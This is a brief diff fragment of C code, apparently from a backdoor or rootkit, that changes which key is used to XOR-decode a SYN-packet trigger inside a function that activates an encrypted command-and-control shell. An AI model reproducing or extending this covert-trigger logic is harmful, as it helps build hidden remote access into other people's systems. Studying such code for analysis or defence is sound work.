@@ -221,7 +221,7 @@ void activate_command_control_shell_encrypted(char* argv){
     strncpy(section, payload+0x06, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     strncpy(section2, payload+0x0A, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
     for(int ii=0; ii<CC_TRIGGER_SYN_PACKET_SECTION_LEN; ii++){
-        result[ii] = section[ii] ^ section2[ii] ^ key2[ii];
+        result[ii] = section[ii] ^ section2[ii] ^ key3[ii];
     }
 
     strncpy(payload+0x0C, result, CC_TRIGGER_SYN_PACKET_SECTION_LEN);
